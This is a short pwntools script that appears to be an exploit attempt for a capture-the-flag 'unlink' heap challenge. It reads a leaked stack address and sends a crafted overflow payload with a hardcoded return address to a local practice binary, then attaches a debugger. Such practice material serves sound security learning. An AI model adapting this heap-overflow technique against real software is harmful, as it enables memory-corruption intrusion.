from pwn import *

context.log_level = 'debug'
p = process('/home/unlink/unlink')
p.recvuntil('leak: ')
stack = int(p.recvline().strip())
data1 = stack + 0x28
data2 = '\xeb\x84\x04\x08'
data1 = p32(data1)
p.sendline('6'*4*4 + data1 + data2)
gdb.attach(p.proc.pid)
